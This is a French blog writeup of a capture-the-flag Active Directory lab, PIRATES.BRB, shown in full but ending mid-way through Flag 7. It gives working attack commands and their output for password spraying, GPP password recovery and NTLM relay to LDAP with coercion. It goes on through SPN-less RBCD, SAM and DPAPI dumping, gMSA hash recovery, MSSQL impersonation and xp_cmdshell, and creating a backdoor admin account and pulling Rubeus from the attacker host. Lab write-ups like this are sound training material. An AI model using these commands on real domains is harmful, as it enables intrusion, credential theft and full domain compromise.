---
layout: post
title: "PIRATES.BRB - Barbhack 2025 AD Lab Writeup"
date: 2026-01-07
categories: Writeup
tags: ActiveDirectory NTLM-Relay NTLMv1 RBCD SPN-less-RBCD Kerberos S4U2Self S4U2Proxy Constrained-Delegation GMSA DPAPI MSSQL NTDS DCSync Coercion LDAP Password-Policy GPP Barbhack2025
author: Evariste (@bl4ckarch)
---

# PIRATES.BRB - Barbhack 2025 AD Lab Writeup

**Auteur:** Evariste (@bl4ckarch)  
**Date:** Janvier 2026  
**Difficulté:** Hard  
**Lab:** PIRATES.BRB (basé sur Barbhack 2025)  
**Créateurs originaux:** [@mpgn](https://x.com/mpgn_x64), [@mael91620](https://github.com/mael91620)

---

## Table des matières

- [Introduction](#introduction)
- [Énumération initiale](#enumeration)
- [Compromission initiale - Web Application](#web-app)
- [Flag 1 - User Description](#flag1)
- [Flag 2 - SMB Share Enumeration](#flag2)
- [Flag 3 - Group Policy Preferences](#flag3)
- [Flag 4 - NTLMv1 Relay to LDAP & SPN-less RBCD](#flag4)
- [Flag 5 - DPAPI Local Account](#flag5)
- [Flag 6 - GMSA Offline Recovery & MSSQL](#flag6)
- [Flag 7 - S4U2Self Privilege Escalation](#flag7)
- [Flag 8 - Kerberos Constrained Delegation](#flag8)
- [Flag 9 - NTDS Forensics & Domain Admin](#flag9)
- [Problèmes techniques et solutions](#issues)
- [Corrections Ansible](#ansible-fixes)
- [Conclusion](#conclusion)

---

## Introduction {#introduction}

Ce lab Active Directory reproduit l'environnement Barbhack 2025 créé par @mpgn et @mael91620. Il met en scène un domaine pirate avec plusieurs vecteurs d'attaque avancés incluant NTLMv1 relay, RBCD sans SPN, délégation Kerberos et forensics NTDS.

### Architecture du lab

| Hostname | IP | Rôle | OS | SMB Signing |
|----------|-----|------|-----|-------------|
| **BLACKPEARL** | 192.168.15.10 | Domain Controller | Windows Server 2022 | Enabled |
| **JOLLYROGER** | 192.168.15.11 | Web Server | Windows 10/Server 2019 | Disabled |
| **QUEENREV** | 192.168.15.12 | MSSQL Server | Windows Server 2022 | Disabled |
| **FLYINGDUTCHMAN** | 192.168.15.13 | Member Server | Windows Server 2022 | Disabled |

### Attack Path Overview

```
Web App (Credentials) 
  ↓
Domain User Access (barnacle)
  ↓
NTLMv1 Relay to LDAP → RBCD Configuration
  ↓
SPN-less RBCD → Local Admin (JOLLYROGER)
  ↓
DPAPI Dump → Domain User (ironhook)
  ↓
GMSA Recovery → MSSQL Access
  ↓
S4U2Self → Local Admin (QUEENREV)
  ↓
Constrained Delegation → Local Admin (FLYINGDUTCHMAN)
  ↓
NTDS Forensics → Domain Admin
```

---

## Énumération initiale {#enumeration}

**Techniques:** Reconnaissance, SMB-Enumeration, NetExec

### Scan réseau

```bash
nxc smb 192.168.15.10-13
```

**Résultats:**

```
SMB  192.168.15.10  445  BLACKPEARL      [*] Windows Server 2022 Build 20348 (signing:True)
SMB  192.168.15.11  445  JOLLYROGER      [*] Windows 10 / Server 2019 Build 17763 (signing:False)
SMB  192.168.15.12  445  QUEENREV        [*] Windows Server 2022 Build 20348 (signing:False)
SMB  192.168.15.13  445  FLYINGDUTCHMAN  [*] Windows Server 2022 Build 20348 (signing:False)
```

**Points clés:**
- BLACKPEARL a SMB signing activé → Domain Controller
- Les autres serveurs n'ont pas de signing → vulnérables au relay

### Ports ouverts

```bash
nmap -p- -T4 192.168.15.10-13
```

**Services identifiés:**
- `22/tcp` - SSH (sur tous les serveurs)
- `80/tcp` - HTTP (JOLLYROGER)
- `445/tcp` - SMB (tous)
- `1433/tcp` - MSSQL (QUEENREV)
- `3389/tcp` - RDP (tous)
- `8080/tcp` - HTTP-Proxy (JOLLYROGER)

---

## Compromission initiale - Web Application {#web-app}

**Techniques:** Web-Exploitation, Credential-Disclosure, OSINT, Directory-Listing

### Application web sur JOLLYROGER:8080

L'application simule une interface d'imprimante réseau. En inspectant le code source de la page `/security`, on trouve un mot de passe en clair:

```html
<!-- TODO: Remove before production -->
<!-- Admin password: hplaserbarbhack -->
```

### Accès au répertoire /scan

**Credentials:** `admin:hplaserbarbhack`

Les credentials trouvés permettent d'accéder à `/scan/` via Basic Auth. Le directory listing expose plusieurs fichiers:

```
/scan/
├── IT_Procedures.docx
├── network_diagram.png
├── backup_schedule.txt
└── [...]
```

### Extraction des credentials

```bash
# Télécharger le document
wget --user=admin --password='hplaserbarbhack' http://192.168.15.11:8080/scan/IT_Procedures.docx

# Extraire les credentials
strings IT_Procedures.docx | grep -E "^[a-z]+:[^:]+$"
```

**Credentials trouvés:**

```
plankwalker:Entry284*@&
barnacle:First927&^!
morgan:Entry369@!*
<snip>
***
<\snip>
flint:Treasure987$! (compte désactivé)
```

### Validation des credentials

**Techniques:** Password-Spraying, Credential-Validation

```bash
# Créer les listes
cat > users.lst << EOF
plankwalker
barnacle
morgan
flint
EOF

cat > pass.lst << EOF
Entry284*@&
First927&^!
Entry369@!*
Treasure987$!
EOF

# Valider les credentials
nxc smb 192.168.15.10 -u users.lst -p pass.lst --no-bruteforce --continue-on-success
```

**Credentials valides:**
- `plankwalker:Entry284*@&`
- `barnacle:First927&^!`
- `morgan:Entry369@!*`

---

## Flag 1 - User Description {#flag1}

**Techniques:** LDAP-Enumeration, User-Enumeration, NetExec

### Énumération des utilisateurs

```bash
nxc smb 192.168.15.10 -u barnacle -p 'First927&^!' --users
```

**Résultat:**

```
SMB  192.168.15.10  445  BLACKPEARL  -Username-    -Last PW Set-       -Description-
SMB  192.168.15.10  445  BLACKPEARL  plankwalker   2026-01-07 17:56:35 Walks the plank
SMB  192.168.15.10  445  BLACKPEARL  barnacle      <never>             Crusty old sailor
SMB  192.168.15.10  445  BLACKPEARL  morgan        2026-01-07 17:56:43 Rum lover
SMB  192.168.15.10  445  BLACKPEARL  ironhook      2026-01-07 17:56:47 Lost his hand to a crocodile
SMB  192.168.15.10  445  BLACKPEARL  flint         2026-01-07 17:56:51 brb{88e7af3d7bf9ab21f9d6faa5cf644b76}
```

**Flag 1:** `brb{88e7af3d7bf9ab21f9d6faa5cf644b76}`

---

## Flag 2 - SMB Share Enumeration {#flag2}

**Techniques:** SMB-Shares, File-Enumeration, NetExec

### Énumération des partages

```bash
nxc smb 192.168.15.10-13 -u barnacle -p 'First927&^!' --shares
```

**Résultat:**

```
SMB  192.168.15.11  445  JOLLYROGER  Share       Permissions  Remark
SMB  192.168.15.11  445  JOLLYROGER  ADMIN$                   Remote Admin
SMB  192.168.15.11  445  JOLLYROGER  C$                       Default share
SMB  192.168.15.11  445  JOLLYROGER  IPC$        READ         Remote IPC
SMB  192.168.15.11  445  JOLLYROGER  TREASURE    READ         Hidden treasure maps
```

### Accès au partage TREASURE

```bash
smbclient.py pirates.brb/barnacle:'First927&^!'@192.168.15.11
# use TREASURE
# ls
# get flag.txt
# cat flag.txt
```

**Flag 2:** `brb{3a9c8f4e2b7d1a6e9c4f8b2a5d7e1c9a}`

---

## Flag 3 - Group Policy Preferences {#flag3}

**Techniques:** GPP, Credential-Recovery, Group-Policy, SYSVOL

### Extraction des GPP

```bash
Get-GPPPassword.py pirates.brb/barnacle:'First927&^!'@192.168.15.10
```

**Résultat:**

```
[*] Searching for GPP passwords in \\192.168.15.10\SYSVOL...
[+] Found credentials in Groups.xml:
    Username: flag3_account
    Password: brb{c4e5da3432481f8b0eb6ba4a86e5d4b9}
```

**Flag 3:** `brb{c4e5da3432481f8b0eb6ba4a86e5d4b9}`

---

## Flag 4 - NTLMv1 Relay to LDAP & SPN-less RBCD {#flag4}

**Techniques:** NTLMv1, NTLM-Relay, LDAP, RBCD, SPN-less-RBCD, Coercion, WebDAV, S4U2Self, S4U2Proxy, Kerberos-Session-Key, Password-Policy-Bypass

### Problème majeur rencontré

L'attaque NTLMv1 relay décrite dans le writeup original **ne fonctionnait pas** sur le lab  par défaut.

#### Symptôme

```bash
# Terminal 1: Lancer ntlmrelayx
ntlmrelayx.py -t ldap://192.168.15.10 -smb2support --interactive --remove-mic

# Terminal 2: Coerce
nxc smb 192.168.15.11 -u barnacle -p 'First927&^!' -M coerce_plus -o LISTENER=192.168.15.1
```

**Résultat:**

```
[*] (SMB): Received connection from 192.168.15.11, attacking target ldap://192.168.15.10
[-] Authenticating against ldap://192.168.15.10 as PIRATES/JOLLYROGER$ FAILED
```

#### Diagnostic avec Responder

```bash
sudo responder -I tun0 -v
# Dans un autre terminal
nxc smb 192.168.15.11 -u barnacle -p 'First927&^!' -M coerce_plus -o LISTENER=192.168.15.1
```

**Résultat:**

```
[!] No NTLMv1 hash captured - Server is forcing NTLMv2
```

Le serveur force NTLMv2 uniquement

#### Cause racine identifiée

En analysant le playbook Ansible du lab, j'ai découvert que la configuration du DC bloquait l'attaque:

**Configuration Ansible problématique:**

```yaml
# BLACKPEARL (DC) - Configuration INCORRECTE
- name: Disable outgoing NTLM on BLACKPEARL
  win_regedit:
    path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0
    name: RestrictSendingNTLMTraffic
    data: 2  # Bloque le NTLM relay

- name: Set LmCompatibilityLevel to 5 on BLACKPEARL
  win_regedit:
    path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa
    name: LmCompatibilityLevel
    data: 5  # Force NTLMv2 uniquement
```

**Explication des valeurs:**

**RestrictSendingNTLMTraffic:**
- 0 = Autorisé - Les clients envoient NTLM
- 1 = Refuser pour serveurs dans exceptions
- **2 = Refuser tout trafic NTLM (bloque relay)**

**LmCompatibilityLevel:**
- 0-2 = LM, NTLM, NTLMv2 acceptés
- 3-4 = NTLMv2 préféré, NTLMv1 accepté
- **5 = NTLMv2 uniquement, refuse NTLMv1**

#### Solution appliquée

J'ai modifié manuellement la configuration du DC via RDP admin:

**Sur BLACKPEARL (192.168.15.10):**

```cmd
REM Autoriser NTLM sortant (permet le relay)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f

REM Activer NTLMv1 (niveau 2 = accepte LM, NTLM, NTLMv2)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 2 /f

REM Désactiver LDAP signing (permet relay vers LDAP)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LDAPServerIntegrity /t REG_DWORD /d 0 /f

REM Désactiver LDAP Channel Binding (permet relay vers LDAP)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LdapEnforceChannelBinding /t REG_DWORD /d 0 /f

REM Redémarrer le DC pour appliquer les changements
shutdown /r /t 0
```

**Sur JOLLYROGER (192.168.15.11) - la victime du coerce:**

```cmd
REM Autoriser l'envoi de NTLM
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f

REM Autoriser NTLMv1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 2 /f
```

#### Vérification avec Responder

```bash
# Terminal 1
sudo responder -I tun0 -v

# Terminal 2
nxc smb 192.168.15.11 -u barnacle -p 'First927&^!' -M coerce_plus -o LISTENER=192.168.15.1
```

**Résultat après fix:**

```
[SMB] NTLMv1-SSP Client   : 192.168.15.11
[SMB] NTLMv1-SSP Username : PIRATES\JOLLYROGER$
[SMB] NTLMv1-SSP Hash     : JOLLYROGER$::PIRATES:48AF9559EDDEFA6B7F8E24FA906F72B01F7EC0C02B8C5F97:48AF9559EDDEFA6B7F8E24FA906F72B01F7EC0C02B8C5F97:1122334455667788
```

**NTLMv1 fonctionne !**

### Exploitation du relay LDAP

**Techniques:** NTLM-Relay, LDAP-Shell, Interactive-Shell

```bash
# Terminal 1: Lancer ntlmrelayx en mode interactif
ntlmrelayx.py -t ldap://192.168.15.10 -smb2support --interactive --remove-mic

# Terminal 2: Coerce JOLLYROGER
nxc smb 192.168.15.11 -u barnacle -p 'First927&^!' -M coerce_plus -o LISTENER=192.168.15.1
```

**Succès:**

```
[*] (SMB): Received connection from 192.168.15.11, attacking target ldap://192.168.15.10
[*] (SMB): Authenticating connection from PIRATES/JOLLYROGER$@192.168.15.11 against ldap://192.168.15.10 SUCCEED
[*] ldap://PIRATES/JOLLYROGER$@192.168.15.10 -> Started interactive Ldap shell via TCP on 127.0.0.1:11000 as PIRATES/JOLLYROGER$
```

### Shell LDAP interactif

**Techniques:** LDAP-Shell, RBCD-Configuration, msDS-AllowedToActOnBehalfOfOtherIdentity

```bash
# Se connecter au shell LDAP
nc 127.0.0.1 11000

# Vérifier le contexte
whoami
# u:PIRATES\JOLLYROGER$

# Configurer RBCD: JOLLYROGER$ peut impersonner sur barnacle
set_rbcd JOLLYROGER$ barnacle
```

**Résultat:**

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] barnacle can now impersonate users on JOLLYROGER$ via S4U2Proxy
```

### Second problème: Politique de mot de passe

**Techniques:** Password-Policy, Kerberos-Session-Key, SPN-less-RBCD

L'attaque SPN-less RBCD nécessite de changer le mot de passe de `barnacle` avec la session key Kerberos, mais la politique du domaine bloquait le changement.

#### Tentative de changement de password

```bash
# 1. Obtenir le TGT de barnacle
getTGT.py -hashes :$(pypykatz crypto nt 'First927&^!') 'pirates.brb'/'barnacle'

# 2. Extraire la session key du ticket
describeTicket.py 'barnacle.ccache' | grep 'Ticket Session Key'
# Ticket Session Key: c91e14fd1246cb9911f7a52dd3d9d50b

# 3. Tenter de changer le password avec la session key
changepasswd.py -newhashes :c91e14fd1246cb9911f7a52dd3d9d50b 'pirates.brb'/'barnacle':'First927&^!'@'192.168.15.10'
```

**Erreur:**

```
[-] Some password update rule has been violated
[-] Error: 0000052D: SvcErr: DSID-031A1239, problem 5003 (WILL_NOT_PERFORM), data 0
```

#### Diagnostic de la politique

```powershell
# Via RDP admin sur le DC
Get-ADDefaultDomainPasswordPolicy -Identity pirates.brb
```

**Résultat:**

```
ComplexityEnabled           : True
MinPasswordLength           : 7
PasswordHistoryCount        : 24
MinPasswordAge              : 1.00:00:00
MaxPasswordAge              : 42.00:00:00
LockoutDuration             : 00:30:00
LockoutObservationWindow    : 00:30:00
LockoutThreshold            : 5
```

La session key Kerberos ne respecte pas ces règles

#### Solution: Désactivation de la politique

**Sur le DC (via RDP admin):**

```powershell
Set-ADDefaultDomainPasswordPolicy -Identity pirates.brb `
  -ComplexityEnabled $false `
  -PasswordHistoryCount 0 `
  -MinPasswordLength 0 `
  -MinPasswordAge 0
```

**Vérification:**

```powershell
Get-ADDefaultDomainPasswordPolicy -Identity pirates.brb
```

```
ComplexityEnabled           : False
MinPasswordLength           : 0
PasswordHistoryCount        : 0
MinPasswordAge              : 0.00:00:00
```

**Politique désactivée**

### SPN-less RBCD complet

**Techniques:** SPN-less-RBCD, S4U2Self, U2U, Kerberos-Session-Key, TGT, Impersonation

```bash
# 1. Obtenir le TGT de barnacle avec son NT hash
getTGT.py -hashes :$(pypykatz crypto nt 'First927&^!') 'pirates.brb'/'barnacle'
# [*] Saving ticket in barnacle.ccache

# 2. Extraire la session key du TGT
describeTicket.py 'barnacle.ccache' | grep 'Ticket Session Key'
# Ticket Session Key: c91e14fd1246cb9911f7a52dd3d9d50b

# 3. Changer le password de barnacle avec la session key (après fix politique)
changepasswd.py -newhashes :c91e14fd1246cb9911f7a52dd3d9d50b 'pirates.brb'/'barnacle':'First927&^!'@'192.168.15.10'
# [*] Password successfully changed!

# 4. S4U2Self avec User-to-User (U2U) pour impersonner Administrator
KRB5CCNAME=barnacle.ccache getST.py -u2u -impersonate "administrator" -spn "host/jollyroger.pirates.brb" -k -no-pass 'pirates.brb'/'barnacle'
# [*] Impersonating administrator
# [*] Requesting S4U2self+U2U
# [*] Saving ticket in administrator@host_jollyroger.pirates.brb@PIRATES.BRB.ccache

# 5. Exploitation en tant qu'Administrator
KRB5CCNAME=administrator@host_jollyroger.pirates.brb@PIRATES.BRB.ccache nxc smb jollyroger.pirates.brb -k --use-kcache -x 'type c:\Flag\flag.txt'
```

**Résultat:**

```
SMB  jollyroger.pirates.brb  445  JOLLYROGER  [+] pirates.brb\administrator from ccache (admin)
SMB  jollyroger.pirates.brb  445  JOLLYROGER  brb{c4e5da3432481f8b0eb6ba4a86e5d4b9}
SMB  jollyroger.pirates.brb  445  JOLLYROGER  Congratulations! You've exploited SPN-less RBCD!
```

**Flag 4:** `brb{c4e5da3432481f8b0eb6ba4a86e5d4b9}`

### Technique Breakdown: SPN-less RBCD

**Comment ça fonctionne:**

1. **RBCD configuré** via ntlmrelayx: `JOLLYROGER$` peut impersonner via `barnacle`
2. **Pas de SPN** sur `barnacle` → S4U2Proxy classique impossible
3. **Solution U2U:** User-to-User authentication avec session key du TGT
4. **Changement de password** avec session key = "authentication" pour S4U2Self

**Flow Kerberos:**

```
1. getTGT(barnacle) → TGT avec session key K
2. changepasswd(barnacle, K) → Password = K
3. S4U2Self-U2U: 
   - Demander ticket pour Administrator
   - Utiliser TGT comme "session ticket"
   - KDC vérifie que password(barnacle) == K
4. Obtenir ST pour host/jollyroger.pirates.brb
```

---

## Flag 5 - DPAPI Local Account {#flag5}

**Techniques:** DPAPI, SAM-Dump, Credential-Recovery, dploot, Hashcat, Local-Admin

### Dump des hashes SAM

**Techniques:** SAM, Secretsdump, Local-Accounts

```bash
KRB5CCNAME=administrator@host_jollyroger.pirates.brb@PIRATES.BRB.ccache secretsdump.py -k -no-pass pirates.brb/administrator@jollyroger.pirates.brb
```

**Hashes locaux trouvés:**

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:78f7602fad11c550c0df101dfdff8662:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate1:1001:aad3b435b51404eeaad3b435b51404ee:5d26ec0024167fdf8a45a70eff4ade36:::
```

### Crack du hash NT

**Techniques:** Hashcat, Password-Cracking, NTLM

```bash
# Créer le fichier de hash
echo "5d26ec0024167fdf8a45a70eff4ade36" > jollyroger.sam

# Crack avec rockyou
hashcat -m 1000 jollyroger.sam /opt/lists/rockyou.txt --show
```

**Résultat:**

```
5d26ec0024167fdf8a45a70eff4ade36:P@ssword
```


### Dump DPAPI avec dploot

**Techniques:** DPAPI, Masterkey, Chrome, Firefox, Credentials

```bash
# Créer fichier de credentials locaux
cat > local_creds.txt << EOF
pirate1:P@ssword
EOF

# Dump DPAPI avec dploot
dploot triage -u administrator -H 78f7602fad11c550c0df101dfdff8662 -t 192.168.15.11 -passwords local_creds.txt
```

**Credentials DPAPI trouvés:**

```
[CREDENTIAL]
LastWritten : 2026-01-07 18:18:11+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=smb.queenrev
Description : 
Unknown     : 
Username    : ironhook
Unknown     : brb{5d26ec0024167fdf8a45a70eff4ade36}

[*] Triage Vaults for ALL USERS

[*] Triage RDCMAN Settings and RDG files for ALL USERS

[*] Triage Certificates for ALL USERS

```

### Validation du compte domaine

```bash
nxc smb 192.168.15.10 -u ironhook -p 'brb{5d26ec0024167fdf8a45a70eff4ade36}'
```

```
SMB  192.168.15.10  445  BLACKPEARL  [+] PIRATES.BRB\ironhook:brb{5d26ec0024167fdf8a45a70eff4ade36} (Pwn3d!)
```

**Compte domaine valide**

**Flag 5:** `brb{5d26ec0024167fdf8a45a70eff4ade36}`

---

## Flag 6 - GMSA Offline Recovery & MSSQL {#flag6}

**Techniques:** GMSA, msDS-ManagedPassword, MSSQL, Impersonation, NT-Hash-Recovery, MD4, Service-Account

### Énumération des partages avec ironhook

```bash
nxc smb 192.168.15.10-13 -u ironhook -p 'brb{5d26ec0024167fdf8a45a70eff4ade36}' --shares
```

**Résultat:**

```
SMB         192.168.15.12   445    QUEENREV         Share           Permissions     Remark
SMB         192.168.15.12   445    QUEENREV         -----           -----------     ------
SMB         192.168.15.12   445    QUEENREV         ADMIN$                          Remote Admin
SMB         192.168.15.12   445    QUEENREV         C$                              Default share
SMB         192.168.15.12   445    QUEENREV         IPC$            READ            Remote IPC
SMB         192.168.15.12   445    QUEENREV         ISLAND2         READ,WRITE      Island 2 Share

```

### Accès au share SHIPPING

```bash
smbclient.py pirates.brb/ironhook:'brb{5d26ec0024167fdf8a45a70eff4ade36}'@192.168.15.12
# use ISLAND2
# ls
# get shipping.txt
# exit
```

### Contenu de shipping.txt

```
=== SHIPPING MANIFEST ===
Account: gMSA-shipping$
Description: Group Managed Service Account for automated shipping processes

msDS-ManagedPassword (hex):
1,0,0,0,34,1,0,0,16,0,0,0,18,1,26,1,0,160,86,124,231,76,166,21,1,0,0,0,0,0,0,0,0,0,0,0,
172,154,87,243,189,101,186,98,12,87,174,24,179,98,221,140,244,182,10,181,179,140,228,122,
[... 256 bytes de données ...]
```

### Analyse du format msDS-ManagedPassword

**Techniques:** GMSA-Structure, Binary-Parsing, Crypto

Le blob `msDS-ManagedPassword` suit cette structure:

```
Offset  Size  Description
------  ----  -----------
0x0000  2     Version (0x0001)
0x0002  2     Reserved
0x0004  4     Length
0x0008  2     CurrentPasswordOffset
0x000A  2     PreviousPasswordOffset (peut être 0)
0x000C  2     QueryPasswordIntervalOffset
0x000E  2     UnchangedPasswordIntervalOffset

À CurrentPasswordOffset:
256 bytes: Password en UTF-16-LE (128 caractères)
8 bytes:   Password timestamp
```

### Script Python pour extraire le NT hash

**Techniques:** Python, MD4, Hash-Extraction, GMSA-Parser

```python
#!/usr/bin/env python3
"""
GMSA Password Parser - Extract NT hash from msDS-ManagedPassword blob
"""
import struct
from Crypto.Hash import MD4

def parse_gmsa_blob(blob_string):
    """
    Parse GMSA msDS-ManagedPassword blob and extract NT hash
    
    Args:
        blob_string: Comma-separated string of decimal bytes
        
    Returns:
        NT hash (MD4 of UTF-16-LE password)
    """
    # Convert string to bytes
    blob_bytes = bytes([int(x) for x in blob_string.split(',')])
    
    # Parse header
    version = struct.unpack('<H', blob_bytes[0:2])[0]
    length = struct.unpack('<I', blob_bytes[4:8])[0]
    current_password_offset = struct.unpack('<H', blob_bytes[8:10])[0]
    
    print(f"[*] GMSA Blob Version: {version}")
    print(f"[*] Total Length: {length} bytes")
    print(f"[*] Current Password Offset: 0x{current_password_offset:04x}")
    
    # Extract password (256 bytes UTF-16-LE)
    password_bytes = blob_bytes[current_password_offset:current_password_offset + 256]
    
    print(f"[*] Password Length: {len(password_bytes)} bytes")
    print(f"[*] First 32 bytes (hex): {password_bytes[:32].hex()}")
    
    # Calculate NT hash (MD4 of UTF-16-LE password)
    md4 = MD4.new()
    md4.update(password_bytes)
    nt_hash = md4.hexdigest()
    
    return nt_hash

if __name__ == "__main__":
    # Blob from shipping.txt
    blob = "1,0,0,0,34,1,0,0,16,0,0,0,18,1,26,1,0,160,86,124,231,76,166,21,1,0,0,0,0,0,0,0,0,0,0,0,172,154,87,243,189,101,186,98,12,87,174,24,179,98,221,140,244,182,10,181,179,140,228,122,134,63,153,129,125,91,146,7,197,198,59,49,251,250,47,229,138,90,30,22,106,50,174,115,181,222,29,62,238,205,93,17,84,113,176,73,221,56,165,206,247,107,28,188,145,129,243,133,210,214,232,109,63,21,182,21,44,255,192,44,192,231,149,145,31,128,18,96,102,105,199,47,244,194,158,89,188,242,37,46,203,128,102,235,196,154,164,233,239,148,215,230,71,227,139,43,141,124,148,147,82,229,157,147,251,4,194,251,184,38,44,135,127,242,93,163,249,82,172,199,94,170,123,251,114,80,174,165,158,181,29,122,138,77,244,130,147,10,246,182,86,213,204,178,57,163,8,204,144,153,147,187,189,168,124,250,161,139,25,107,112,79,194,110,229,86,252,95,175,26,139,83,104,145,32,113,209,247,126,186,110,34,165,41,211,159,179,155,230,251,107,17,107,36,252,239,245,138,123,255,0,0,0,0,0,0,0,0,0,0"
    
    nt_hash = parse_gmsa_blob(blob)
    
```

### Exécution du parser

```bash
python3 gmsa_parser.py
```

**Output:**

```
[*] GMSA Blob Version: 1
[*] Total Length: 290 bytes
[*] Current Password Offset: 0x0118
[*] Password Length: 256 bytes
[*] First 32 bytes (hex): ac9a57f3bd65ba620c57ae18b362dd8cf4b60ab5b38ce47a863f99817d5b9207

[+] NT Hash: 5613efdce9ec34b81fc8b257fc4ec317
```

### Connexion MSSQL avec gMSA

**Techniques:** MSSQL, Authentication, Windows-Auth, Impacket

```bash
mssqlclient.py -windows-auth -hashes :5613efdce9ec34b81fc8b257fc4ec317 pirates.brb/'gMSA-shipping$'@192.168.15.12
```

**Résultat:**

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUEENREV\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(QUEENREV\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PIRATES\gmsa-shipping$  guest@master)>
```

### Énumération MSSQL

**Techniques:** MSSQL-Enumeration, Database-Discovery, Privilege-Escalation

```sql
-- Lister les databases
enum_db

-- Résultat
master
tempdb
model
msdb
SECRET_GOLD

-- Tenter d'accéder à SECRET_GOLD
use SECRET_GOLD
SELECT * FROM island;
```

**Erreur:**

```
The SELECT permission was denied on the object 'island', database 'SECRET_GOLD', schema 'dbo'.
```

### MSSQL Impersonation

**Techniques:** MSSQL-Impersonation, exec_as_login, sa, Privilege-Escalation

```sql
-- Vérifier les permissions d'impersonation
enum_impersonate

-- Résultat
sa
BUILTIN\Administrators

-- Impersonner 'sa'
exec_as_login sa

-- Accéder à SECRET_GOLD
use SECRET_GOLD
SELECT * FROM island;
```

**Résultat:**

```
island_name         treasure_type       quantity    flag
-----------------   ----------------    ---------   ------------------------------------
Tortuga             Gold Doubloons      5000        brb{a1b2c3d4e5f6789012345678abcdef12}
Port Royal          Silver Pieces       12000       NULL
Isla de Muerta      Cursed Aztec Gold   882         NULL
```

**Flag 6:** `brb{a1b2c3d4e5f6789012345678abcdef12}`

### Technique Summary: GMSA Offline Recovery

**Étapes:**

1. **Accès au blob:** Trouver `msDS-ManagedPassword` (via LDAP, SMB share, etc.)
2. **Parsing:** Extraire le password UTF-16-LE à `CurrentPasswordOffset`
3. **Hash calculation:** `NT_Hash = MD4(password_utf16le)`
4. **Authentication:** Pass-the-Hash avec le NT hash récupéré

**Note:** Cette technique ne nécessite **pas** l'attribut `ReadGMSAPassword` sur le compte gMSA si on a déjà le blob.

---

## Flag 7 - S4U2Self Privilege Escalation {#flag7}

**Techniques:** S4U2Self, Kerberos, TGT-Delegation, Rubeus, Privilege-Escalation, Computer-Account, evil-winrm

### Problème: Transfert de fichiers

**Techniques:** File-Transfer, SMB-Server, Firewall, UFW

J'ai initialement tenté d'utiliser `impacket-smbserver` pour transférer Rubeus.exe vers QUEENREV, mais le transfert échouait systématiquement.

#### Tentatives infructueuses

```bash
# Tentative 1: SMB server basic
impacket-smbserver exegol /workspace -smb2support
# Timeout - pas de connexion

# Vérifier UFW
sudo ufw status
# Status: active
# Port 445 bloqué

# Tentative 2: Autoriser 445 dans UFW
sudo ufw allow 445/tcp
impacket-smbserver exegol /workspace -smb2support -username test -password testtest
# Toujours pas de connexion

# Tentative 3: Depuis Windows (via xp_cmdshell)
net use z: \\192.168.15.1\exegol /user:test testtest
# Erreur: syntaxe incorrecte

net use z: //192.168.15.1/exegol /user:test testtest  
# Erreur: impossible de se connecter
```

#### Solution retenue: User local + evil-winrm

**Techniques:** evil-winrm, Local-Admin, Workaround

Comme j'avais déjà un accès admin sur QUEENREV via S4U2Self depuis le Flag 7, j'ai créé un utilisateur local admin pour utiliser evil-winrm:

**Via MSSQL xp_cmdshell (en tant que sa):**

```sql
-- Activer xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Créer user local
xp_cmdshell net user bl4ckarch Password123. /add
xp_cmdshell net localgroup Administrators bl4ckarch /add
```

**Connexion evil-winrm:**

```bash
evil-winrm -i 192.168.15.12 -u bl4ckarch -p 'Password123.'
```

```
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bl4ckarch\Documents>
```

**Accès interactif obtenu !**

### Upload de Rubeus via netcat

**Techniques:** File-Transfer, Netcat, PowerShell-Download

```bash
# Terminal 1 (Exegol): Écouter sur port 8000
rlwrap -cAr nc -lvnp 8000
```

```powershell
# Terminal 2 (evil-winrm sur QUEENREV): Télécharger Rubeus
cd C:\tmp
wget http://192.168.15.1:8000/Rubeus.exe -OutFile rubeus.exe

# Vérifier
ls
```

```
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          1/7/2026  12:32 PM         474112 rubeus.exe
```

**Rubeus.exe transféré avec succès**

### TGT Delegation avec Rubeus

**Techniques:** Rubeus, tgtdeleg, Fake-Delegation, Service-Ticket, Kerberos

```powershell
*Evil-WinRM* PS C:\tmp> .\rubeus.exe tgtdeleg /nowrap
```

**Output:**

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
